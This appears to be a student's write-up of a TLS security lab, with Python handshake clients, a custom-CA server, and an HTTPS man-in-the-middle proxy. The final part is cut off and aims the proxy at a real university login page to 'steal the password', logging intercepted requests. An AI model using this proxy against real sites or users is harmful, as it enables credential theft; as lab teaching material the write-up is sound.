# TLS Lab Steps

## Environment
**3 machines**:
- Client (10.9.0.5)
- Server (10.9.0.43)
- Proxy (10.9.0.143)

# Task 1

## Task 1.a: TLS Handshake

`hanshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
cadir = '/etc/ssl/certs'
#cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())
input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

Running `docker exec -it client-10.9.0.5 python3 /volumes/handshake.py www.linkedin.com` we get:

```
┌──(kali㉿kali)-[~/…/category-crypto/Crypto_TLS/Labsetup/volumes]
└─$ python3 handshake.py www.linkedin.com
After making TCP connection. Press any key to continue ...
=== Cipher used: ('ECDHE-RSA-AES256-GCM-SHA384', 'TLSv1.2', 256)
=== Server hostname: www.linkedin.com
=== Server certificate:
{'OCSP': ('http://ocsp.digicert.com',),
 'caIssuers': ('http://cacerts.digicert.com/DigiCertSHA2SecureServerCA-2.crt',),
 'crlDistributionPoints': ('http://crl3.digicert.com/DigicertSHA2SecureServerCA-1.crl',
                           'http://crl4.digicert.com/DigicertSHA2SecureServerCA-1.crl'),
 'issuer': ((('countryName', 'US'),),
            (('organizationName', 'DigiCert Inc'),),
            (('commonName', 'DigiCert SHA2 Secure Server CA'),)),
 'notAfter': 'Sep 28 23:59:59 2022 GMT',
 'notBefore': 'Mar 28 00:00:00 2022 GMT',
 'serialNumber': '077B4BD9800C26AFAFD92556227DC7E7',
 'subject': ((('countryName', 'US'),),
             (('stateOrProvinceName', 'California'),),
             (('localityName', 'Sunnyvale'),),
             (('organizationName', 'LinkedIn Corporation'),),
             (('commonName', 'www.linkedin.com'),)),
 'subjectAltName': (('DNS', 'www.linkedin.com'),
                    ('DNS', 'linkedin.com'),
                    ('DNS', 'rum5.perf.linkedin.com'),
                    ('DNS', 'exp4.www.linkedin.com'),
                    ('DNS', 'exp3.www.linkedin.com'),
                    ('DNS', 'exp2.www.linkedin.com'),
                    ('DNS', 'exp1.www.linkedin.com'),
                    ('DNS', 'rum2.perf.linkedin.com'),
                    ('DNS', 'rum4.perf.linkedin.com'),
                    ('DNS', 'rum6.perf.linkedin.com'),
                    ('DNS', 'rum17.perf.linkedin.com'),
                    ('DNS', 'rum8.perf.linkedin.com'),
                    ('DNS', 'rum9.perf.linkedin.com'),
                    ('DNS', 'afd.perf.linkedin.com'),
                    ('DNS', 'rum14.perf.linkedin.com'),
                    ('DNS', 'rum18.perf.linkedin.com'),
                    ('DNS', 'rum19.perf.linkedin.com'),
                    ('DNS', 'exp5.www.linkedin.com'),
                    ('DNS', 'realtime.www.linkedin.com'),
                    ('DNS', 'px.ads.linkedin.com'),
                    ('DNS', 'px4.ads.linkedin.com'),
                    ('DNS', 'dc.ads.linkedin.com'),
                    ('DNS', 'lnkd.in'),
                    ('DNS', 'px.jobs.linkedin.com'),
                    ('DNS', 'mid4.linkedin.com')),
 'version': 3}
[{'issuer': ((('countryName', 'US'),),
             (('organizationName', 'DigiCert Inc'),),
             (('organizationalUnitName', 'www.digicert.com'),),
             (('commonName', 'DigiCert Global Root CA'),)),
  'notAfter': 'Nov 10 00:00:00 2031 GMT',
  'notBefore': 'Nov 10 00:00:00 2006 GMT',
  'serialNumber': '083BE056904246B1A1756AC95991C74A',
  'subject': ((('countryName', 'US'),),
              (('organizationName', 'DigiCert Inc'),),
              (('organizationalUnitName', 'www.digicert.com'),),
              (('commonName', 'DigiCert Global Root CA'),)),
  'version': 3}]
After TLS handshake. Press any key to continue ..
```

**Questions:**

- **What is the cipher used between the client and the server?**
  - Cipher used `('ECDHE-RSA-AES256-GCM-SHA384', 'TLSv1.2', 256)`; 
  - Elliptic Curve Diffie-Hellman key exchange. This exchange is signed with RSA, in the same way in both cases.
  - ***(cipher used, SSL protocol version, number of secret bits used)***

- **Please print out the server certificate in the program.**
  - ***View output above.***

- **Explain the purpose of `etc/ssl/certs`.**
  - It is where Root CA certificates are stored, and they're used to verify if a given server's certificate was signed by a root CA. This might include validating the entire certificate chain, of course.

- **Use Wireshark to capture the network traffics during the execution of the program, and explain your observation. In particular, explain which step triggers the TCP handshake, and which step triggers the TLS handshake. Explain the relationship between the TLS handshake and the TCP handshake.**
  - TCP Handshake occurs in packets 3 to 5, where both the client and server establish a connection. This is done after getting the server's IP address from its domain name, shown in packets 1 and 2. 
  - After the TCP handshake, at frame 6, the TLS handshake starts, with:
    - **Client Hello** sending its client random number, available cipher suites, compression methods, MAC algorithm, the algorithm used for key exchange, etc.
    - **Server Hello, Certificate, Server Key Exchange, Server Hello Done**, where the server chooses the cipher to be used (as shown above), no compression (optional), sends its certificate and the server's DH parameter due to the selected cipher suite. It finalizes with a Server Hello Done message.
    - **Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message** where the client sends its key share part of the DH algorithm, Change Cipher Spec message which lets the server know that it has generated the session key and is going to switch to encrypted communication, and finally the Encrypted message.
    - **New Session Ticket, Change Cipher Spec, Encrypted Handshake message**. The Session Ticket is a blob of a session key and associated information encrypted by a key that is only known by the server. The ticket is sent by the server at the end of the TLS handshake for use when the two parties connect in the future (**Zero Round Trip Resumption**). Then it sends the Change Cipher Spec, and lastly, the Encrypted Handshake message using the symmetric previously established key, as well.
  - Afterwards, the connection is terminated.
  - The TLS handshake happens after the TCP handshake. For the TCP or the transport layer, everything in the TLS handshake is just application data. Once the TCP handshake is completed the TLS layer will initiate the TLS handshake (*the TLS position in the stack is after TCP*).

## Task 1.b: CA's Certificate

- Update `cadir` variable:

`hanshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())
input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

From the result obtained previously the Root CA was Digicert Global Root CA: 

`cp /etc/ssl/certs/3513523f.0  ~/Documents/seed-labs/category-crypto/Crypto_TLS/Labsetup/volumes/client-certs`

How to find the certificate? We know the Root CA's name from the given output. We download the `.pem` file certificate and run `openssl x509 -in ~/Downloads/www-linkedin-com.pem -noout -subject_hash` to find the subject's hash value which is `3513523f`. This will be the prefix of the certificate's name in the `/etc/ssl/certs` folder.

Enter the container: 
- `docker exec -it client-10.9.0.5 bash`
- `cd volumes/`
- `python3 handshake.py www.linkedin.com`

For `facebook.com` we would download it's Root CA certificate and run `openssl x509 -in ~/Downloads/facebook-com.pem -noout -subject_hash`. The hash is `244b5494` and the we can copy it by doing `cp /etc/ssl/certs/244b5494.0  ~/Documents/seed-labs/category-crypto/Crypto_TLS/Labsetup/volumes/client-certs`.

Enter the container: 
- `docker exec -it client-10.9.0.5 bash`
- `cd volumes/`
- `python3 handshake.py www.facebook.com`

## Task 1.c: Experiment with the hostname check

- Get IP of `www.example.com` running `dig www.example.com`. The output is `93.184.216.34`.
- Enter the client container running `docker exec -it client-10.9.0.5 bash`.
- Change `/etc/hosts` file by adding the following line to it:

```
93.184.216.34 www.example2020.com
```
- Set `check_hostname` to `False`.

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = False

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())
input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

Running `python3 handshake.py www.example2020.com`, we see the communication succeeded even though the retrieved subject name in the certificate of the TLS handshake was `www.example.com` instead of `www.example2020.com`. But, as we turned off this check, we don't get an error. The same doesn't happen if we change the `check_hostname` variable back to `True`. 

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())
input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

Running `python3 handshake.py www.example2020.com`, we get a "certificate verify failed" error:

```
root@fc7e182ebe1a:/volumes# python3 handshake.py www.example2020.com
After making TCP connection. Press any key to continue ...
Traceback (most recent call last):
  File "handshake.py", line 29, in <module>
    ssock.do_handshake()   # Start the handshake
  File "/usr/lib/python3.8/ssl.py", line 1309, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'www.example2020.com'. (_ssl.c:1123)
```

## Task 1.d: Sending and getting Data

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())

# Send HTTP Request to Server
request = b"GET / HTTP/1.0\r\nHost: " + \
        hostname.encode('utf-8') + b"\r\n\r\n"
ssock.sendall(request)

# Read HTTP Response from Server
response = ssock.recv(2048)
while response:
    pprint.pprint(response.split(b"\r\n"))
    response = ssock.recv(2048)

input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

- (1) Run `python3 handshake.py www.linkedin.com` inside the client container and observe the output. It's the `www.linkedin.com` HTML.

- (2) Fetch an image file.

When loading the LinkedIn page and opening the network tab in firefox we can see the different requests made to several resources. One of them is LinkedIn's main image at `https://static-exp2.licdn.com/aero-v1/sc/h/dxf91zhqd2z6b0bwg85ktm5s4`. If we modified the python script to use the path `/aero-v1/sc/h/dxf91zhqd2z6b0bwg85ktm5s4` and invoke the script with the hostname `static-exp2.licdn.com` by running `python3 handshake.py static-exp2.licdn.com`, we can successfully obtain the image.

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())

# Send HTTP Request to Server
request = b"GET /aero-v1/sc/h/dxf91zhqd2z6b0bwg85ktm5s4 HTTP/1.0\r\nHost: " + \
        hostname.encode('utf-8') + b"\r\n\r\n"
ssock.sendall(request)

# Read HTTP Response from Server
f = open('image.svg', 'wb')
response = ssock.recv(2048)
first_stream = response.split(b"\r\n") # Excluding HTTP/1.0 200 OK string
flag = False

for st in first_stream:
    if flag:
        f.write(st)
    if b'<svg' in st:
        flag = True
        f.write(st)

while response:
    pprint.pprint(response.split(b"\r\n"))
    response = ssock.recv(2048)
    f.write(response.split(b"\r\n")[0])

f.close()

input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

This will generate an `image.svg` file which can be later opened in the browser to compare with the `www.linkedin.com` image.

# Task 2: TLS Server

## Task 2.a: Implement a simple TLS server

`server.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import pprint

html = """
HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
<!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
"""

SERVER_CERT = './server-certs/mycert.crt'
SERVER_PRIVATE = './server-certs/mycert.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    newsock, fromaddr = sock.accept()
    try:
        ssock = context.wrap_socket(newsock, server_side=True)
        print("TLS connection established")
        data = ssock.recv(1024)              # Read data over TLS
        pprint.pprint("Request: {}".format(data))
        ssock.sendall(html.encode('utf-8'))  # Send data over TLS

        ssock.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        ssock.close()

    except Exception:
        print("TLS connection fails")
        continue
```

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
# cadir = '/etc/ssl/certs'
cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())

input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

- After running `sh gen_cert.sh` to produce the server certificates and copy them to the `server-certs` folder, append `10.9.0.43   www.pinto2022.com` to the `/etc/hosts` file in the **client container**.

- To update de CA certificate in the `client-certs` folder, execute the command `openssl x509 -in ca.crt -noout -subject_hash` in the `volumes/` folder. This will generate the Root CA hash, which will be the certificate the client will validate. 
  
- We then run:

```
cp ca.crt client-certs/
mv client-certs/ca.crt client-certs/9da13359.0
```

- We then start the server:

```
docker exec -it server-10.9.0.43 bash
cd volumes/
python3 server.py
```

- And the client: 

```
docker exec -it client-10.9.0.5 bash
cd volumes/
python3 handshake.py www.pinto2022.com
```

Output:

```
root@fc7e182ebe1a:/volumes# python3 handshake.py www.pinto2022.com  
After making TCP connection. Press any key to continue ...  
=== Cipher used: ('TLS_AES_256_GCM_SHA384', 'TLSv1.3', 256)  
=== Server hostname: www.pinto2022.com  
=== Server certificate:  
{'issuer': ((('countryName', 'AU'),),  
 (('stateOrProvinceName', 'Some-State'),),  
 (('organizationName', 'Internet Widgits Pty Ltd'),)),  
 'notAfter': 'Jun 1 17:52:57 2032 GMT',  
 'notBefore': 'Jun 4 17:52:57 2022 GMT',  
 'serialNumber': '1003',  
 'subject': ((('commonName', 'www.pinto2022.com'),),),  
 'version': 3}  
[{'issuer': ((('countryName', 'AU'),),
 (('stateOrProvinceName', 'Some-State'),),
 (('organizationName', 'Internet Widgits Pty Ltd'),)),
 'notAfter': 'Jun 1 17:40:59 2032 GMT',
 'notBefore': 'Jun 4 17:40:59 2022 GMT',
 'serialNumber': '6C0AD2774E77DE2F4C46788435F196B8CAC2DEB9',
 'subject': ((('countryName', 'AU'),),
(('stateOrProvinceName', 'Some-State'),),
(('organizationName', 'Internet Widgits Pty Ltd'),)),
'version': 3}]
After TLS handshake. Press any key to continue ...
```

- As seen in the server certificate, the subject is `www.pinto2022.com` and the issuer is our CA with all the default parameters.

Changing the `cadir` variable back to `/etc/ssl/certs` will throw a certificate verification error because there will be no matching root CA in that folder.

`handshake.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import sys
import pprint

hostname = sys.argv[1]
port = 443
cadir = '/etc/ssl/certs'
# cadir = './client-certs'

# Set up the TLS context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM

context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True

# Create TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
input("After making TCP connection. Press any key to continue ...")

# Add the TLS
ssock = context.wrap_socket(sock, server_hostname=hostname,
                            do_handshake_on_connect=False)
ssock.do_handshake()   # Start the handshake
print("=== Cipher used: {}".format(ssock.cipher()))
print("=== Server hostname: {}".format(ssock.server_hostname))
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
pprint.pprint(context.get_ca_certs())

input("After TLS handshake. Press any key to continue ...")

# Close the TLS Connection
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
```

Output:

```
root@fc7e182ebe1a:/volumes# python3 handshake.py www.pinto2022.com
After making TCP connection. Press any key to continue ...
Traceback (most recent call last):
  File "handshake.py", line 29, in <module>
    ssock.do_handshake()   # Start the handshake
  File "/usr/lib/python3.8/ssl.py", line 1309, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)
```


## Task 2.b: Testing the server program using browsers

- Append `10.9.0.43   www.pinto2022.com` to the `/etc/hosts` file in host machine.
- Open Firefox, enter `about:preferences#privacy` > View Certificates > Authorities tab > Import CA certificate > Check "Trust this CA to identify websites".
- With the `server.py` script running in the server container, access https://pinto2022.com.
## Task 2.c: Certificate with multiple names

- Use `server_openssl.cnf` to set up multiple names for the `pinto2022` website. We then change the `CA_openssl.cnf` file in the `copy_extensions` field to copy the extension field from the certificate signing request into the final certificate (disabled by default). Then, we use the run `gen_cert_multiple_names.sh`. Then we copy the generated certificates into the `server-certs/` folder.
- Then we update the hosts `/etc/hosts` file with the new domain entries.

```
10.9.0.43       www.pinto2022.com
10.9.0.43       www.pinto2022.org
10.9.0.43       abc.pinto2022.com
```

Changing the `SERVER_CERT` and `SERVER_PRIVATE` variables:

`server.py`

```python3

#!/usr/bin/env python3

import socket
import ssl
import pprint

html = """
HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
<!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
"""

# SERVER_CERT = './server-certs/mycert.crt'
# SERVER_PRIVATE = './server-certs/mycert.key'
SERVER_CERT = './server-certs/mycert_multiple.crt'
SERVER_PRIVATE = './server-certs/mycert_multiple.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    newsock, fromaddr = sock.accept()
    try:
        ssock = context.wrap_socket(newsock, server_side=True)
        print("TLS connection established")
        data = ssock.recv(1024)              # Read data over TLS
        pprint.pprint("Request: {}".format(data))
        ssock.sendall(html.encode('utf-8'))  # Send data over TLS

        ssock.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        ssock.close()

    except Exception:
        print("TLS connection fails")
        continue
```

- Rerun `server.py`.
- Open the browser and test all the domains above.

# Task 3: A Simple HTTPS Proxy

- Add the following entry to `/etc/hosts` in the Host VM. Comment out the other ones added before.

```
10.9.0.143      www.pinto2022.com
```

This simulates the existence of a proxy because the traffic for `www.pinto2022.com` will be redirected through `10.9.0.143`.

- Add `nameserver   8.8.8.8` to the `/etc/resolv.conf` in the **proxy** container.

- **Launch the MITM attack against your own server.**
  - Add `10.9.0.43  www.pinto2022.com` to the `/etc/hosts/` of the **proxy** container.
  
  - Run `server.py` in the server container, and `proxy.py` in the proxy container.
  - Type `www.pinto2022.com` in the browser.
  
  - `proxy.py`
  
```python3
#!/usr/bin/env python3

import socket
import ssl
import pprint
import threading

def process_request(ssock_for_browser):
    hostname = "www.pinto2022.com"

    # Make a connection to the real server
    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
    
    cadir = './client-certs'
    context_client.load_verify_locations(capath=cadir)
    context_client.verify_mode = ssl.CERT_REQUIRED
    context_client.check_hostname = True
    sock_for_server = socket.create_connection((hostname, 443))
    ssock_for_server = context_client.wrap_socket(
        sock_for_server,
        server_hostname=hostname,
        do_handshake_on_connect=False
    )
    
    ssock_for_server.do_handshake() 
    request = ssock_for_browser.recv(2048)
    pprint.pprint("Request: {}".format(request))
    if request:
        # Forward request to server
        ssock_for_server.sendall(request)

        # Get response from server, and forward it to browser
        response = ssock_for_server.recv(2048)
        response = response.replace(b"Bank32", b"FEUP22")
        while response:
            ssock_for_browser.sendall(response) # Forward to browser
            response = ssock_for_server.recv(2048)
            response = response.replace(b"Bank32", b"FEUP22")
            
    ssock_for_browser.shutdown(socket.SHUT_RDWR)
    ssock_for_browser.close()

# SERVER_CERT = './server-certs/mycert.crt'
# SERVER_PRIVATE = './server-certs/mycert.key'
SERVER_CERT = './server-certs/mycert_multiple.crt'
SERVER_PRIVATE = './server-certs/mycert_multiple.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    sock_for_browser, fromaddr = sock.accept()
    try:
        ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
        x.start()
        # print("TLS connection established")
        # data = ssock_for_browser.recv(1024)              # Read data over TLS
        # pprint.pprint("Request: {}".format(data))
        # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS

        # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        # ssock_for_browser.close()

    except Exception:
        print("TLS connection fails")
        continue
```

- `server.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import pprint

html = """
HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
<!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
"""

# SERVER_CERT = './server-certs/mycert.crt'
# SERVER_PRIVATE = './server-certs/mycert.key'
SERVER_CERT = './server-certs/mycert_multiple.crt'
SERVER_PRIVATE = './server-certs/mycert_multiple.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    newsock, fromaddr = sock.accept()
    try:
        ssock = context.wrap_socket(newsock, server_side=True)
        print("TLS connection established")
        data = ssock.recv(1024)              # Read data over TLS
        pprint.pprint("Request: {}".format(data))
        ssock.sendall(html.encode('utf-8'))  # Send data over TLS

        ssock.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        ssock.close()

    except Exception:
        print("TLS connection fails")
        continue
```

  - In the `proxy.py` code the `Bank32` string on every response gets replaced by `FEUP22`. This way we show our MITM agent is working.

- **Launch the MITM attack on a real HTTPS website that has a login. Steal the password.**
  - **Target:** https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e1s2
  - Generate `wayf.up.pt` certificate by running `gen_cert_wayf.sh` and move the certificates to the `server-certs/` folder.
  - Append `/etc/hosts` in the Host Vm with `10.9.0.143      wayf.up.pt`.
  - Launch `proxy.py`

```python3
#!/usr/bin/env python3

import socket
import ssl
import pprint
import threading

def process_request(ssock_for_browser):
    hostname = "wayf.up.pt"

    # Make a connection to the real server
    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
    
    cadir = '/etc/ssl/certs'
    context_client.load_verify_locations(capath=cadir)
    context_client.verify_mode = ssl.CERT_REQUIRED
    context_client.check_hostname = True
    sock_for_server = socket.create_connection((hostname, 443))
    ssock_for_server = context_client.wrap_socket(
        sock_for_server,
        server_hostname=hostname,
        do_handshake_on_connect=False
    )
    
    ssock_for_server.do_handshake() 
    request = ssock_for_browser.recv(2048)
    pprint.pprint("Request: {}".format(request))
    if request:
        # Forward request to server
        ssock_for_server.sendall(request)

        # Get response from server, and forward it to browser
        response = ssock_for_server.recv(2048)
        while response:
            ssock_for_browser.sendall(response) # Forward to browser
            response = ssock_for_server.recv(2048)
            
    ssock_for_browser.shutdown(socket.SHUT_RDWR)
    ssock_for_browser.close()

# SERVER_CERT = './server-certs/mycert.crt'
# SERVER_PRIVATE = './server-certs/mycert.key'
SERVER_CERT = './server-certs/wayf.crt'
SERVER_PRIVATE = './server-certs/wayf.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
